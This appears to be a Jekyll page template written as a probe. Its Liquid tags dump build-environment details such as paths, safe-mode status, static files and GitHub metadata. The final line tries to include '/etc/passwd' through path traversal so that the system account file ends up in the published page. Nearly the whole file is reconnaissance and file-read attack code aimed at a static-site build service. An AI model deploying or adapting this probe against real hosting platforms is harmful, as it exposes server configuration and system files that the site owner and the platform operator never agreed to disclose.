---
layout: default
title: probe
---

# Liquid probes (simplified)

- jekyll.version: {{ jekyll.version }}
- jekyll.env: {{ jekyll.environment }}
- site.time: {{ site.time }}
- site.url: {{ site.url }}
- site.baseurl: {{ site.baseurl }}
- site.source: {{ site.source }}
- site.destination: {{ site.destination }}
- site.plugins_dir: {{ site.plugins_dir }}
- site.safe: {{ site.safe }}
- site.whitelist (count): {{ site.whitelist | size }}

Static files:
{% for f in site.static_files limit:30 %}* {{ f.path }}
{% endfor %}

Pages-specific via github metadata:
{% if site.github %}{% for k in site.github %}- {{ k[0] }}: {{ k[1] }}
{% endfor %}{% endif %}

Test {% include %} traversal:
{% include /etc/passwd %}
